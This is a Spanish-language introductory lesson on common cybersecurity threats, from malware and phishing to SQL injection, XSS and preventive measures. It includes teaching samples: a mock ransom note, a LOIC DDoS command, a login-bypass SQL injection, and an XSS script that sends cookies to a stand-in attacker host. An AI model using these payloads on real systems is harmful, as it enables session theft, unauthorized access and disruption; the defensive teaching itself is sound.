Amenazas Comunes en Ciberseguridad

En el mundo de la ciberseguridad, conocer las amenazas es el primer paso para protegerse contra ellas. A medida que la tecnología evoluciona, también lo hacen las técnicas utilizadas por los ciberdelincuentes para comprometer sistemas y datos. Esta lección explora las amenazas más comunes que debes conocer.

Malware: Software Malicioso

El malware, abreviatura de "software malicioso", es cualquier programa o código diseñado específicamente para dañar, interrumpir o obtener acceso no autorizado a sistemas informáticos. Existen varios tipos:

Principales tipos de malware

Virus

Código malicioso que se adjunta a programas legítimos y se propaga cuando se ejecuta el programa infectado. Requieren intervención humana para propagarse.

Troyanos

Software que parece legítimo pero contiene código malicioso. No se replican a sí mismos, pero pueden crear puertas traseras para accesos futuros.

Ransomware

Malware que cifra los archivos del usuario y exige un pago (rescate) para restaurar el acceso. Ejemplos notables incluyen WannaCry y Petya.

# Ejemplo de mensaje de ransomware
YOUR FILES HAVE BEEN ENCRYPTED!
To decrypt your files, send 0.5 BTC to the following address:
1AbC...XyZ
After payment, contact decrypt@malware.com with your unique ID: 938A7F
Spyware

Software que espía las actividades del usuario, recopilando información como contraseñas, hábitos de navegación y datos personales.

Gusanos

Malware autorreplicante que se propaga a través de redes sin intervención humana, consumiendo ancho de banda y recursos del sistema.

Phishing y Ataques de Ingeniería Social

La ingeniería social es el arte de manipular psicológicamente a las personas para que revelen información confidencial o realicen acciones específicas. El phishing es una de las técnicas más comunes:

  • Phishing por correo electrónico: Mensajes que suplantan a entidades legítimas (bancos, servicios online) para obtener credenciales o información sensible.
  • Spear phishing: Ataques de phishing dirigidos y personalizados para objetivos específicos.
  • Whaling: Ataques dirigidos específicamente a ejecutivos o personas de alto nivel.
  • Vishing: Phishing a través de llamadas telefónicas.
  • Smishing: Phishing mediante mensajes SMS.

Caso de estudio: Ataque de phishing

En 2016, John Podesta, jefe de campaña de Hillary Clinton, fue víctima de un ataque de phishing que resultó en la filtración de miles de correos electrónicos. Un simple correo electrónico falso que imitaba a Google solicitando cambiar su contraseña llevó a una de las brechas de seguridad más notables en la política estadounidense reciente.

Man-in-the-Middle (MitM)

Los ataques Man-in-the-Middle ocurren cuando un atacante se posiciona entre dos partes que se comunican, interceptando y posiblemente alterando la información que se transmite:

  1. El atacante intercepta la comunicación entre la víctima y el servidor legítimo.
  2. El atacante puede leer, insertar y modificar los datos en tránsito sin que las partes lo sepan.
  3. Este tipo de ataques son especialmente peligrosos en redes Wi-Fi públicas y no seguras.

Ataques de Denegación de Servicio (DoS y DDoS)

Estos ataques buscan saturar un sistema, servicio o red para que no esté disponible para los usuarios legítimos:

  • DoS (Denegación de Servicio): Ataque desde una única fuente.
  • DDoS (Denegación de Servicio Distribuida): Ataque coordinado desde múltiples fuentes, generalmente utilizando una botnet (red de dispositivos infectados).
# Ejemplo de comando LOIC (Low Orbit Ion Cannon) para DDoS
# NO EJECUTAR - SOLO CON FINES EDUCATIVOS
python loic.py --target www.ejemplo.com --port 80 --method HTTP

Métodos comunes de ataques DDoS

  • SYN Flood: Envía gran cantidad de solicitudes de conexión TCP SYN sin completar el protocolo de enlace de tres vías.
  • UDP Flood: Inunda puertos con paquetes UDP para saturar el ancho de banda.
  • HTTP Flood: Sobrecarga servidores web con solicitudes HTTP GET o POST aparentemente legítimas.
  • Amplificación DNS: Utiliza servidores DNS para amplificar el tráfico dirigido a la víctima.

Inyecciones SQL

La inyección SQL es una técnica que aprovecha vulnerabilidades en la validación de entrada para insertar código SQL malicioso en consultas que se envían a bases de datos:

  • Permite a los atacantes acceder, modificar o eliminar datos no autorizados.
  • Puede comprometer la integridad de la base de datos entera.
  • Se previene principalmente mediante la validación adecuada de entradas y el uso de consultas parametrizadas.
# Ejemplo de inyección SQL básica
# En un campo de inicio de sesión:

Username: admin' --
Password: cualquiercosa

# El código SQL resultante sería:
SELECT * FROM usuarios WHERE username = 'admin' -- ' AND password = 'hash_password'

# Los caracteres -- comentan el resto de la consulta, permitiendo el acceso sin conocer la contraseña

Ataques de Fuerza Bruta

Los ataques de fuerza bruta intentan descubrir contraseñas o claves mediante prueba y error, probando sistemáticamente todas las combinaciones posibles hasta encontrar la correcta:

  • Ataque de diccionario: Usa una lista de palabras comunes.
  • Ataque híbrido: Combina el ataque de diccionario con permutaciones.
  • Fuerza bruta pura: Prueba todas las combinaciones posibles de caracteres.

CONSEJO DE SEGURIDAD:

Utiliza contraseñas fuertes: mínimo 12 caracteres, combinando mayúsculas, minúsculas, números y símbolos. La autenticación de dos factores (2FA) añade una capa adicional de seguridad que hace que los ataques de fuerza bruta sean prácticamente inútiles, incluso si la contraseña es descubierta.

Cross-Site Scripting (XSS)

Los ataques XSS implican la inyección de scripts maliciosos en sitios web confiables. Cuando un usuario visita el sitio comprometido, el script se ejecuta en su navegador:

  • XSS Persistente (Almacenado): El código malicioso se almacena en el servidor (por ejemplo, en un comentario) y se ejecuta cada vez que un usuario carga la página afectada.
  • XSS Reflejado: El código malicioso se envía a través de la URL y se ejecuta inmediatamente cuando la víctima hace clic en un enlace manipulado.
  • XSS basado en DOM: La vulnerabilidad existe en el código del lado del cliente y no requiere que los datos maliciosos se envíen al servidor.
# Ejemplo simple de ataque XSS
# En un campo de comentario de un blog:

<script>
  document.addEventListener('DOMContentLoaded', function() {
    var token = document.cookie;
    var img = new Image();
    img.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(token);
  });
</script>

Amenazas internas

No todas las amenazas provienen del exterior. Los empleados, contratistas o socios comerciales con acceso legítimo a los sistemas pueden representar un riesgo significativo:

  • Empleados descontentos que buscan venganza
  • Usuarios internos que accidentalmente comprometen la seguridad
  • Insiders maliciosos contratados o sobornados por competidores u otros actores externos

Conclusión y medidas preventivas

Comprender las amenazas es fundamental para defenderse contra ellas. Algunas medidas preventivas básicas incluyen:

  1. Mantener software y sistemas actualizados con los últimos parches de seguridad
  2. Utilizar soluciones antivirus y firewalls actualizados
  3. Implementar políticas de contraseñas fuertes y autenticación de múltiples factores
  4. Capacitar regularmente a los usuarios sobre amenazas y prácticas seguras
  5. Realizar copias de seguridad periódicas de datos importantes
  6. Implementar el principio de menor privilegio para el acceso a sistemas
  7. Monitorizar y auditar regularmente los sistemas para detectar actividades sospechosas

Herramientas básicas para protegerse

  • Firewalls: Bloquean el acceso no autorizado mientras permiten comunicaciones legítimas.
  • Antivirus: Detectan y eliminan malware conocido.
  • VPN: Cifra la conexión a internet, especialmente útil en redes Wi-Fi públicas.
  • Gestores de contraseñas: Generan y almacenan contraseñas seguras y únicas para cada servicio.
  • Software 2FA: Añade una capa adicional de seguridad al proceso de autenticación.
